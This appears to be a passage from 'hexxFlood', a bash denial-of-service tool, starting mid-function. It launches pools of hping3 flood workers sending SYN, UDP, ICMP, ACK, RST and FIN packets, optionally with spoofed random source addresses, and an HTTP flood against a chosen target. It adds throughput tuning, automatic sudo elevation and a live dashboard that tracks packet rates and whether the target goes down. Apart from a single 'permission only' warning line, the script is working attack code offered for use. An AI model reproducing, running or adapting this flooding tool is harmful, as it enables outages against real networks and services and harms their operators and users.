        ack)  sudo $DETACH hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
        rst)  sudo $DETACH hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
        fin)  sudo $DETACH hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
    esac
}

# Cumulative TX packet / byte counters straight from the kernel (/sys). This is
# far lighter and more exact than forking ifconfig every tick, so the live
# monitor costs almost nothing and never steals cycles from the flood.
get_packet_count() {
    local iface="${1:-$INTERFACE}" c
    c=$(cat "/sys/class/net/$iface/statistics/tx_packets" 2>/dev/null)
    [ -z "$c" ] && c=$(ifconfig "$iface" 2>/dev/null | grep "TX packets" | awk '{print $5}' | head -1)
    echo "${c:-0}"
}

get_tx_bytes() {
    local iface="${1:-$INTERFACE}" c
    c=$(cat "/sys/class/net/$iface/statistics/tx_bytes" 2>/dev/null)
    echo "${c:-0}"
}

# Instantaneous CPU-busy % from /proc/stat deltas (no `top` fork per tick).
# Uses the CPU_PREV_* globals to remember the previous sample.
cpu_busy_pct() {
    local a b c d e f g rest idle total dt di
    read -r _ a b c d e f g rest < /proc/stat
    idle=$(( d + e ))
    total=$(( a + b + c + d + e + f + g ))
    dt=$(( total - ${CPU_PREV_TOTAL:-0} ))
    di=$(( idle - ${CPU_PREV_IDLE:-0} ))
    CPU_PREV_TOTAL=$total; CPU_PREV_IDLE=$idle
    if [ "$dt" -le 0 ]; then echo 0; else echo $(( (100 * (dt - di)) / dt )); fi
}

# Used/total memory as a compact "1.2/7.6G" string, read from /proc/meminfo.
mem_used_str() {
    awk '/MemTotal:/{t=$2} /MemAvailable:/{a=$2}
         END{printf "%.1f/%.1fG", (t-a)/1048576, t/1048576}' /proc/meminfo 2>/dev/null
}

# Render a proportional bar: $1=value $2=max $3=width. Scales to max, clamps.
draw_bar() {
    local v=$1 max=$2 w=$3 filled i out=""
    [ "$max" -le 0 ] && max=1
    filled=$(( v * w / max )); [ $filled -gt $w ] && filled=$w; [ $filled -lt 0 ] && filled=0
    for ((i = 0; i < filled; i++)); do out+="█"; done
    for ((i = filled; i < w; i++)); do out+="░"; done
    printf '%s' "$out"
}

# Print one dashboard line: expand escapes, clear to end-of-line, then CR+LF so
# every line starts at column 0 even if a child briefly touched the TTY.
pln() { printf '%b\033[K\r\n' "$1"; }

# Bits/sec -> human "12.3 Mbps" / "1.23 Gbps".
fmt_bps() {
    awk -v b="$1" 'BEGIN{
        if (b>=1e9)      printf "%.2f Gbps", b/1e9;
        else if (b>=1e6) printf "%.1f Mbps", b/1e6;
        else if (b>=1e3) printf "%.1f Kbps", b/1e3;
        else             printf "%d bps", b;
    }'
}

monitor_attack() {
    # Reuse the baseline captured in main() (set before launch) so the timer and
    # packet totals count from the real attack start; fall back if unset.
    local start_time=${ATTACK_START_TIME:-$(date +%s)}
    local initial_packets=${ATTACK_INITIAL_PACKETS:-$(get_packet_count)}
    local initial_bytes=$(get_tx_bytes)
    local duration=$ATTACK_DURATION
    ATTACK_START_TIME=$start_time
    ATTACK_INITIAL_PACKETS=$initial_packets

    local dur_disp="∞"; [ "$duration" -gt 0 ] && dur_disp="${duration}s"
    local tgt_disp="$TARGET"
    [ "$TARGET_TYPE" = "url" ] && tgt_disp="$URL  (${TARGET})"

    # hping3 banner (proof the engine launched against the target/size/mode).
    local hbanner=""
    [ -s "${HPING_LOG:-/nonexistent}" ] && hbanner=$(head -1 "$HPING_LOG")

    # ---- enter live-dashboard mode on the ALTERNATE screen buffer (like htop/
    # less/vim): the frame updates in place with no scrollback gaps, and the
    # original terminal (banner/config) is restored untouched when we exit. ----
    DASHBOARD_ACTIVE=1
    local HOME_C='' CLR_BELOW=''
    ( stty sane </dev/tty ) >/dev/null 2>&1 || true
    if [ -t 1 ]; then
        printf '\033[?1049h\033[?25l\033[?7l\033[H\033[2J'  # alt screen, hide cursor, nowrap, clear+home
        HOME_C='\033[H'; CLR_BELOW='\033[J'
        ALT_SCREEN=1
        printf '%b\r\n' "${WHITE}☢️  hexxFlood LIVE — collecting first sample…${NC}"
    fi

    # Prime CPU + rate baselines so the first frame shows a real delta.
    cpu_busy_pct >/dev/null
    local prev_packets=$initial_packets prev_bytes=$initial_bytes prev_time=$start_time
    local pps_max=1
    local -a evlog=()          # rolling command-output log (last few lines)

    local REFRESH=1
    while true; do
        local now=$(date +%s)
        local elapsed=$(( now - start_time ))

        if [ $duration -gt 0 ] && [ $elapsed -ge $duration ]; then
            break
        fi

        local cur_packets=$(get_packet_count)
        local cur_bytes=$(get_tx_bytes)
        local packets_sent=$(( cur_packets - initial_packets ))
        [ $packets_sent -lt 0 ] && packets_sent=0

        local dt=$(( now - prev_time )); [ $dt -le 0 ] && dt=1
        local dpkts=$(( cur_packets - prev_packets )); [ $dpkts -lt 0 ] && dpkts=0
        local dbytes=$(( cur_bytes - prev_bytes )); [ $dbytes -lt 0 ] && dbytes=0
        local pps=$(( dpkts / dt ))                         # live pps
        local avg=0; [ $elapsed -gt 0 ] && avg=$(( packets_sent / elapsed ))
        local bps=$(( (dbytes / dt) * 8 ))                 # live bits/sec (real NIC)
        prev_packets=$cur_packets; prev_bytes=$cur_bytes; prev_time=$now
        [ $pps -gt $pps_max ] && pps_max=$pps

        # Per-attack-type hping3 process breakdown (real, from the process list).
        local c_syn=0 c_udp=0 c_icmp=0 c_ack=0 c_rst=0 c_fin=0 hcount=0 line
        while IFS= read -r line; do
            [ -z "$line" ] && continue
            hcount=$(( hcount + 1 ))
            case " $line " in
                *" -S "*) c_syn=$((c_syn+1)) ;;
                *" -2 "*) c_udp=$((c_udp+1)) ;;
                *" -1 "*) c_icmp=$((c_icmp+1)) ;;
                *" -A "*) c_ack=$((c_ack+1)) ;;
                *" -R "*) c_rst=$((c_rst+1)) ;;
                *" -F "*) c_fin=$((c_fin+1)) ;;
            esac
        done < <(pgrep -a hping3 2>/dev/null)
        # NOTE: `pgrep -c` already prints 0 (and exits 1) with no match, so a
        # `|| echo 0` would append a SECOND 0 and inject a stray newline.
        local httpc; httpc=$(pgrep -cf http_flood.py 2>/dev/null); httpc=${httpc:-0}

        local cpu=$(cpu_busy_pct)
        local mem=$(mem_used_str)
        local conns=$(ss -tan 2>/dev/null | grep -c ESTAB)

        # Real ping output line for the command-output panel.
        local pingraw
        pingraw=$(ping -c 1 -W 1 "$TARGET" 2>/dev/null | sed -n '2p')
        local respcol
        if [ -n "$pingraw" ]; then
            respcol="${GREEN}$(echo "$pingraw" | grep -o 'time=[0-9.]* ms' | head -1)${NC}"
            evlog+=("${GREEN}✓${NC} $(date +%H:%M:%S) ${pingraw}")
        else
            respcol="${RED}DOWN / no reply${NC}"
            evlog+=("${RED}✗${NC} $(date +%H:%M:%S) ping ${TARGET}: request timed out")
        fi
        [ ${#evlog[@]} -gt 5 ] && evlog=("${evlog[@]: -5}")

        local status
        if { [ "$hcount" -gt 0 ] || [ "$httpc" -gt 0 ]; } && [ $dpkts -gt 0 ]; then
            status="${GREEN}⚡ SENDING${NC}"
        else
            status="${RED}·· IDLE  ${NC}"
        fi
        local rem="${dur_disp}"
        [ $duration -gt 0 ] && rem="$(( duration - elapsed ))s left"

        # ---- render frame (cursor home; each line clears to EOL; no flicker) --
        local cols; cols=$(tput cols 2>/dev/null); [[ "$cols" =~ ^[0-9]+$ ]] || cols=80
        local barw=$(( cols - 40 )); [ $barw -gt 40 ] && barw=40; [ $barw -lt 10 ] && barw=10
        local div; div=$(printf '─%.0s' $(seq 1 $(( cols>80?80:cols )) ))
        local bar; bar=$(draw_bar "$pps" "$pps_max" "$barw")

        # Pad the command-output panel to a CONSTANT 5 rows so the frame height
        # never changes between ticks (no jitter, no drift).
        local shown=( "${evlog[@]}" )
        while [ ${#shown[@]} -lt 5 ]; do shown+=(""); done

        { printf "$HOME_C"
          pln "${RED}☢️  hexxFlood LIVE  ${NC}${CYAN}$(date +%H:%M:%S)${NC}   ${status}"
          pln "${CYAN}${div}${NC}"
          pln "${YELLOW}🎯 Target :${NC} ${WHITE}${tgt_disp}${NC}"
          pln "${YELLOW}⚙️  Config :${NC} iface ${WHITE}${INTERFACE}${NC}  mode ${WHITE}${MODE:-custom}${NC}  types ${WHITE}${ATTACK_TYPES}${NC}  pkt ${WHITE}${PACKET_SIZE}B${NC}"
          pln "${YELLOW}⏱️  Time   :${NC} ${WHITE}${elapsed}s${NC}  (${rem})"
          pln "${CYAN}${div}${NC}"
          pln "${YELLOW}📦 Packets:${NC} ${WHITE}$(printf "%'d" "$packets_sent")${NC} sent"
          pln "${YELLOW}⚡ Live   :${NC} ${GREEN}$(printf "%'d" "$pps")${NC} pps  ${CYAN}[${bar}]${NC}"
          pln "${YELLOW}📈 Avg    :${NC} ${WHITE}$(printf "%'d" "$avg")${NC} pps      ${YELLOW}🌐 TX:${NC} ${WHITE}$(fmt_bps "$bps")${NC}"
          pln "${YELLOW}🩺 Target :${NC} ${respcol}      ${YELLOW}🔌 Est.conn:${NC} ${WHITE}${conns}${NC}"
          pln "${YELLOW}🖥️  Host   :${NC} cpu ${WHITE}${cpu}%${NC}  mem ${WHITE}${mem}${NC}"
          pln "${CYAN}${div}${NC}"
          pln "${YELLOW}🧨 hping3 :${NC} ${WHITE}${hcount}${NC} procs  →  ${WHITE}syn:${c_syn} udp:${c_udp} icmp:${c_icmp} ack:${c_ack} rst:${c_rst} fin:${c_fin}${NC}   ${YELLOW}http:${NC} ${WHITE}${httpc}${NC}"
          pln "${PURPLE}   ┗ ${hbanner:- (no hping3 sampler)}${NC}"
          pln "${CYAN}${div}${NC}"
          pln "${WHITE}📜 Live command output${NC}"
          local e
          for e in "${shown[@]}"; do pln "   ${e}"; done
          pln "${RED}Press Ctrl+C to stop${NC}"
          printf "$CLR_BELOW"           # clear anything left below the frame
        }

        sleep "$REFRESH"
    done
    # Duration finished: reuse the same clean, structured shutdown as Ctrl+C
    cleanup
}

cleanup() {
    # Ignore further Ctrl+C while tidying up, and never run the body twice
    trap '' SIGINT SIGTERM
    [ "${CLEANUP_DONE:-0}" = 1 ] && exit 0
    CLEANUP_DONE=1

    # A flood child killed with -9 can leave the TTY in raw mode (newlines stop
    # doing a carriage return -> the "staircase" mess). Restore the REAL terminal
    # (target /dev/tty, not the script's stdin which may be redirected).
    ( stty sane </dev/tty ) >/dev/null 2>&1 || true

    # If the live dashboard used the alternate screen, LEAVE it — this restores
    # the original terminal (banner/config) exactly as it was, with no blank
    # gaps, and the final summary then prints cleanly beneath it.
    [ "${ALT_SCREEN:-0}" = 1 ] && printf '\033[?1049l' 2>/dev/null
    printf '\033[?7h\033[?25h\033[0m\r' 2>/dev/null   # wrap on, cursor on, reset
    tput cnorm 2>/dev/null

    # Detach background flood jobs so bash won't print async "Killed" notices
    disown -a 2>/dev/null || true

    # Gently SIGINT the logged sampler first so hping3 flushes its real
    # "N packets transmitted" summary to the log before we hard-kill the rest.
    if [ -n "${HPING_SAMPLER_PID:-}" ]; then
        sudo kill -INT "$HPING_SAMPLER_PID" 2>/dev/null
        sleep 0.3
    fi
    local hping_summary=""
    if [ -f "${HPING_LOG:-/nonexistent}" ]; then
        hping_summary=$(grep -a "packets transmitted" "$HPING_LOG" | tail -1)
    fi

    # Stop everything quietly (hide job-control + kill output)
    { sudo pkill -9 hping3; sudo pkill -9 -f http_flood.py; } >/dev/null 2>&1
    rm -f /tmp/http_flood.py "${HPING_LOG:-/tmp/hexxflood_hping.log}" 2>/dev/null
    wait 2>/dev/null

    # Put any tuned NIC / kernel / CPU settings back exactly as we found them.
    restore_system_tuning

    # Final stats (if the attack actually started)
    local elapsed=0 total=0 avg=0
    if [ -n "${ATTACK_START_TIME:-}" ]; then
        elapsed=$(( $(date +%s) - ATTACK_START_TIME ))
        total=$(( $(get_packet_count) - ${ATTACK_INITIAL_PACKETS:-0} ))
        [ "$elapsed" -gt 0 ] && avg=$(( total / elapsed ))
    fi

    # Rules that adapt to the terminal width so they never wrap on small screens
    local cols; cols=$(tput cols 2>/dev/null)
    [[ "$cols" =~ ^[0-9]+$ ]] && [ "$cols" -gt 0 ] || cols=64
    [ "$cols" -gt 64 ] && cols=64
    local heavy light
    heavy=$(printf '━%.0s' $(seq 1 "$cols"))
    light=$(printf '─%.0s' $(seq 1 "$cols"))

    # Print each line with an explicit carriage return (\r\n). This guarantees
    # every line starts at column 0 even if a killed child left the TTY in raw
    # mode — so the summary is always left-aligned, never "staircased".
    pl() { printf '%b\r\n' "$1"; }

    # Structured summary appended BELOW the existing output (nothing is cleared,
    # so the full attack view stays visible and the stats land at the very end).
    pl ""
    pl ""
    pl "${CYAN}${heavy}${NC}"
    pl "   ${YELLOW}🛑  hexxFlood — Attack Stopped${NC}"
    pl "${CYAN}${heavy}${NC}"
    pl ""
    pl "   ${GREEN}✔${NC}  hping3 flood processes terminated"
    pl "   ${GREEN}✔${NC}  HTTP flood terminated"
    pl "   ${GREEN}✔${NC}  Temporary files removed"
    [ "${TUNING_APPLIED:-0}" = 1 ] && pl "   ${GREEN}✔${NC}  System settings restored"
    pl ""
    if [ -n "${ATTACK_START_TIME:-}" ]; then
        pl "   ${YELLOW}📊 Final Statistics${NC}"
        pl "      Total Packets Sent : ${GREEN}$(printf "%'d" "$total")${NC}"
        pl "      Total Attack Time  : ${GREEN}${elapsed}s${NC}"
        pl "      Average PPS        : ${GREEN}$(printf "%'d" "$avg")${NC}"
        [ -n "$hping_summary" ] && pl "      hping3 (sampler)   : ${GREEN}${hping_summary}${NC}"
        pl ""
    fi
    pl "${CYAN}${light}${NC}"
    pl "   ${GREEN}✅ Cleanup complete.${NC}  Stay ethical. 👋"
    pl "${CYAN}${light}${NC}"
    pl ""
    exit 0
}

# Decide whether we run with root and, if not, ask the user what to do.
# hexxFlood's raw-packet engine (hping3 --flood) and system tuning need root;
# only the HTTP/URL flood works unprivileged. Behaviour:
#   * already root (or launched via sudo) -> just proceed.
#   * monitor-only mode                    -> never needs root, proceed.
#   * otherwise prompt: "Run as root?"
#       - yes (default): re-exec the whole script under sudo (ONE password
#                        prompt), so every child runs as root cleanly.
#       - no           : keep running unprivileged. If the attack has an HTTP
#                        path we continue with raw floods + tuning disabled;
#                        if it is raw-packet only, there is nothing to do, so
#                        we explain and exit instead of spamming sudo prompts.
ensure_privileges() {
    if [ "$EUID" -eq 0 ]; then
        RUN_AS_ROOT=1
        return 0
    fi
    RUN_AS_ROOT=0

    # The live monitor reads /sys + ping only — no root required.
    [ "$RUN_MONITOR_ONLY" = true ] && return 0

    # Does the chosen attack have an unprivileged path (Python HTTP/URL flood)?
    local has_http=0
    if [ "$TARGET_TYPE" = "url" ] || [[ ",$ATTACK_TYPES," == *",http,"* ]]; then
        has_http=1
    fi

    echo -e "${YELLOW}🔐 hexxFlood's raw-packet engine (hping3) and system tuning need ROOT.${NC}"
    echo -e "${YELLOW}   You are not root right now.${NC}"
    echo ""

    local ans=""
    # A configured/env AUTO_ROOT preference skips the interactive prompt.
    case "${AUTO_ROOT,,}" in
        1|y|yes|true)
            ans="y"
            echo -e "${CYAN}   (AUTO_ROOT=${AUTO_ROOT}: elevating automatically)${NC}" ;;
        0|n|no|false)
            ans="n"
            echo -e "${CYAN}   (AUTO_ROOT=${AUTO_ROOT}: staying unprivileged)${NC}" ;;
        *)
            # Read the answer from the real terminal so it works even if stdin is piped.
            read -r -p "$(echo -e "${WHITE}Run as root now? [Y/n]: ${NC}")" ans </dev/tty 2>/dev/null ;;
    esac

    case "${ans,,}" in
        n|no)
            if [ "$has_http" != 1 ]; then
                echo ""
                echo -e "${RED}❌ This attack is raw-packet only and needs root, which you declined.${NC}"
                echo -e "${YELLOW}   Re-run and choose 'Y', or start it directly with:  sudo $0 $*${NC}"
                exit 1
            fi
            echo -e "${YELLOW}⚠️  Continuing WITHOUT root: only the HTTP/URL flood will run —${NC}"
            echo -e "${YELLOW}   raw-packet floods (hping3) and system tuning are disabled.${NC}"
            echo ""
            SYS_TUNE=false        # can't tune the kernel/NIC without root
            RUN_AS_ROOT=0
            ;;
        *)
            echo -e "${CYAN}🔼 Elevating with sudo (you'll be asked for your password once)…${NC}"
            # -E keeps env (DISPLAY/HEXXFLOOD_WORKERS/…); SUDO_USER lets us drop
            # back to the real user for git + monitor windows. Re-runs from the
            # top, so ensure_privileges() sees EUID 0 and returns immediately.
            exec sudo -E bash "$0" "${SCRIPT_ARGS[@]}"
            ;;
    esac
}

main() {
    trap cleanup SIGINT SIGTERM
    # Remember the original CLI args so we can re-exec verbatim under sudo.
    SCRIPT_ARGS=("$@")
    show_banner
    parse_args "$@"

    # Standalone monitor: run the monitor and exit (no attack)
    if [ "$RUN_MONITOR_ONLY" = true ]; then
        if [ ! -f "$MONITOR_SCRIPT" ]; then
            echo -e "${RED}❌ monitor.sh not found at $MONITOR_SCRIPT${NC}"; exit 1
        fi
        trap - SIGINT SIGTERM
        exec bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$MONITOR_MODE"
    fi

    [ -n "$MODE" ] && set_mode

    # Ask about / acquire root before doing any real work (may re-exec via sudo).
    ensure_privileges "$@"

    # Validate numeric inputs against documented ranges
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 200 ]; then
        echo -e "${RED}❌ Threads must be a number between 1 and 200${NC}"; exit 1
    fi
    if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65495 ]; then
        echo -e "${RED}❌ Packet size must be between 64 and 65495${NC}"; exit 1
    fi
    if ! [[ "$TX_QUEUE_LEN" =~ ^[0-9]+$ ]] || [ "$TX_QUEUE_LEN" -lt 1 ]; then
        echo -e "${RED}❌ --tx-queue must be a positive number${NC}"; exit 1
    fi
    if [ -n "$WORKER_CAP" ] && { ! [[ "$WORKER_CAP" =~ ^[0-9]+$ ]] || [ "$WORKER_CAP" -lt 1 ]; }; then
        echo -e "${RED}❌ --cap must be a positive number (omit it for no cap)${NC}"; exit 1
    fi
    if ! ifconfig "$INTERFACE" &>/dev/null; then
        echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
    fi

    # Resolve "auto" system tuning: on for the heavy modes, off otherwise.
    if [ -z "$SYS_TUNE" ]; then
        case "${MODE:-custom}" in
            high|extreme|apocalypse) SYS_TUNE=true ;;
            *)                       SYS_TUNE=false ;;
        esac
    fi

    # Expand the "all" shortcut now so the config display and pool sizing see the
    # real type list, then size the flood pool for maximum throughput.
    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"
    compute_flood_workers

    echo -e "${YELLOW}Configuration:${NC}"
    echo "  Target Type: ${TARGET_TYPE^^}"
    [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
    echo "  Target IP: $TARGET"
    echo "  Mode: ${MODE:-custom}"
    echo "  Attack Types: ${ATTACK_TYPES:-all}"
    echo "  Packet Size: $PACKET_SIZE bytes"
    echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers (${CORES} CPU cores)$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
    [ "${WIFI_CAPPED:-0}" = 1 ] && echo -e "  ${YELLOW}↳ workers capped to ${FLOOD_WORKERS} — ${CAP_REASON}.${NC} Use ${WHITE}--no-cap${NC}${YELLOW} for full power (no limit).${NC}"
    echo "  Privileges: $([ "${RUN_AS_ROOT:-0}" = 1 ] && echo "root (full raw-packet engine)" || echo "user (HTTP/URL flood only)")"
    echo "  System Tuning: $([ "$SYS_TUNE" = true ] && echo "on (restored on exit)" || echo "off")"
    echo "  Duration: ${ATTACK_DURATION:-Infinite}"
    echo ""
    echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
    echo ""

    # Baseline for the final summary — captured BEFORE any launch so a Ctrl+C
    # during startup still reports total packets / time / PPS.
    ATTACK_START_TIME=$(date +%s)
    ATTACK_INITIAL_PACKETS=$(get_packet_count)

    # Fully detach flood children from the controlling terminal so they can't
    # put it into raw mode (the "staircase" bug). setsid gives them their own
    # session with no controlling tty; fall back gracefully if unavailable.
    DETACH="setsid"; command -v setsid >/dev/null 2>&1 || DETACH=""

    # Apply safe, restorable system tuning (only when enabled) BEFORE launching.
    apply_system_tuning

    # Auto-open monitor terminal(s) so progress is visible while the attack runs
    launch_monitors

    if [[ "$ATTACK_TYPES" == *"http"* ]] || [ "$TARGET_TYPE" = "url" ]; then
        echo -e "${GREEN}🌐 Starting HTTP flood on $URL${NC}"
        http_flood "$URL" "$THREADS" "$ATTACK_DURATION"
        echo -e "${GREEN}✅ HTTP flood started${NC}"
        echo ""
    fi

    # Raw-packet (hping3) engine needs root. Skip it cleanly when unprivileged
    # instead of firing hundreds of per-command sudo password prompts.
    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),' && [ "${RUN_AS_ROOT:-0}" != 1 ]; then
        echo -e "${YELLOW}⚠️  Skipping raw-packet flood (syn/udp/icmp/ack/rst/fin) — it needs root.${NC}"
        echo ""
    elif echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
        echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
        echo -e "${GREEN}⚡ ${FLOOD_WORKERS} flood workers across ${CORES} cores — full power${NC}"
        echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
        echo ""

        # IP spoofing — disabled by --no-spoof
        SPOOF_FLAG=""
        [ "$SPOOF_IP" = true ] && SPOOF_FLAG="--rand-source"

        # Destination ports — custom (-P) overrides the per-type defaults
        if [ -n "$CUSTOM_PORTS" ]; then
            TCP_PORTS=$(echo "$CUSTOM_PORTS" | tr ',' ' ')
            UDP_PORTS="$TCP_PORTS"
        else
            TCP_PORTS="80"
            UDP_PORTS="53"
        fi

        # Incrementing dst port (++) by default; --fixed-ports uses a static port
        PP=""
        [ "$RANDOM_PORTS" = true ] && PP="++"

        # Build the list of (type:port) work items from the selected types.
        local -a specs=()
        local type p
        for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
            case $type in
                icmp)            specs+=("icmp:") ;;
                syn|ack|rst|fin) for p in $TCP_PORTS; do specs+=("$type:$p"); done ;;
                udp)             for p in $UDP_PORTS; do specs+=("udp:$p"); done ;;
            esac
        done
        local nspec=${#specs[@]}; [ "$nspec" -eq 0 ] && nspec=1
        # Run at least one worker per work item so every type/port is covered.
        [ "$FLOOD_WORKERS" -lt "$nspec" ] && FLOOD_WORKERS=$nspec

        # Spawn the pool, round-robining the work items across workers.
        local w spec
        for (( w = 0; w < FLOOD_WORKERS; w++ )); do
            spec=${specs[$(( w % nspec ))]}
            launch_flood "${spec%%:*}" "${spec#*:}"
        done

        # One extra "sampler" flood whose real hping3 output is captured to a log
        # (the pool above stays silent for speed). It mirrors the first work item
        # so the banner reflects the actual attack, and its "packets transmitted"
        # summary is shown on stop. stdin=/dev/null + output to a file means it
        # never touches the TTY, so no setsid is needed and we keep its PID to
        # SIGINT it cleanly for the summary.
        HPING_LOG="/tmp/hexxflood_hping.log"
        : > "$HPING_LOG" 2>/dev/null
        local s_type="${specs[0]%%:*}" s_port="${specs[0]#*:}"
        case "$s_type" in
            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            icmp) sudo hping3 -1 --flood $SPOOF_FLAG               -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$s_port -d $PACKET_SIZE $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
        esac
        HPING_SAMPLER_PID=$!
    fi

    # Detach the background flood jobs from job control so bash doesn't print
    # async "Killed"/"Terminated" notices over our output when cleanup kills them.
    disown -a 2>/dev/null || true

    monitor_attack
}

main "$@"
